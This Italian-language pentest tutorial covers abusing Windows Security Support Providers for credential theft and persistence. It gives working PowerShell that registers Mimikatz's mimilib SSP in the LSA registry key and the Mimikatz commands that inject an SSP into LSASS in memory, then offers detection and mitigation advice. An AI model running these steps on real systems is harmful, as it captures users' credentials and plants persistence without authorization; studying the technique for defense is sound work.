# Security Support Provider personalizzati

{{#include ../../banners/hacktricks-training.md}}

[Security Support Provider (SSP)](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi) sono pacchetti di sicurezza basati su DLL caricati dalla Local Security Authority (LSA). Windows registra le DLL SSP/AP personalizzate tramite il valore `REG_MULTI_SZ` `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` e carica i pacchetti registrati all'avvio del sistema.<sup>[[1]](#references)</sup>

Poiché gli SSP vengono eseguiti nella LSA e possono ricevere credenziali, gli adversary possono abusare di un pacchetto malevolo per ottenere l'accesso alle credenziali e garantire la persistenza. MITRE monitora questo comportamento come T1547.005.<sup>[[2]](#references)</sup>

## Mimikatz `mimilib`

Mimikatz include `mimilib.dll`, che implementa un SSP in grado di registrare le credenziali gestite dopo il caricamento. In un lab autorizzato, posiziona la DLL corrispondente all'architettura target in `C:\Windows\System32`, quindi controlla l'elenco dei pacchetti attuali prima di modificarlo.<sup>[[2]](#references)[[3]](#references)</sup>
```powershell
$lsaPath = 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa'
$packages = (Get-ItemProperty -Path $lsaPath -Name 'Security Packages').'Security Packages'
$packages
```
Un valore esistente tipico può contenere pacchetti come `kerberos`, `msv1_0`, `schannel`, `wdigest`, `tspkg` e `pku2u`. Mantieni ogni voce esistente quando aggiungi il pacchetto personalizzato.<sup>[[1]](#references)</sup>

Aggiungi `mimilib` in coda senza sostituire i pacchetti esistenti:
```powershell
if ($packages -notcontains 'mimilib') {
Set-ItemProperty -Path $lsaPath -Name 'Security Packages' -Value ($packages + 'mimilib')
}
```
Dopo un riavvio, il pacchetto viene caricato in LSA e le credenziali acquisite successivamente vengono scritte in `C:\Windows\System32\kiwissp.log` da questa implementazione.<sup>[[2]](#references)[[3]](#references)</sup>

## Caricamento in memoria

Mimikatz può anche iniettare la propria implementazione SSP nel processo LSASS corrente:<sup>[[3]](#references)</sup>
```text
privilege::debug
misc::memssp
```
Questo metodo non persiste dopo un riavvio.<sup>[[2]](#references)[[3]](#references)</sup>

## Rilevamento e mitigazione

Monitora le modifiche a `...\Lsa\Security Packages` e i caricamenti imprevisti di DLL in `lsass.exe`. L'evento di sicurezza 4657 registra una modifica del **valore** del registro solo quando i criteri Audit Registry e la SACL pertinenti sono configurati.<sup>[[2]](#references)[[4]](#references)</sup>

Quando compatibile, abilita la protezione LSA aggiuntiva e analizza le DLL SSP non firmate o imprevise. Microsoft documenta specificamente la protezione LSA come controllo contro l'iniezione di codice che potrebbe compromettere le credenziali.<sup>[[5]](#references)</sup>

## References

- [1] [Microsoft Learn - Registrazione delle DLL SSP/AP](https://learn.microsoft.com/en-us/windows/win32/secauthn/registering-ssp-ap-dlls)
- [2] [MITRE ATT&CK T1547.005 - Security Support Provider](https://attack.mitre.org/techniques/T1547/005/)
- [3] [Repository Mimikatz - `mimilib`](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib)
- [4] [Microsoft Learn - Evento di sicurezza 4657](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4657)
- [5] [Microsoft Learn - Configurazione della protezione LSA aggiuntiva](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection)
{{#include ../../banners/hacktricks-training.md}}
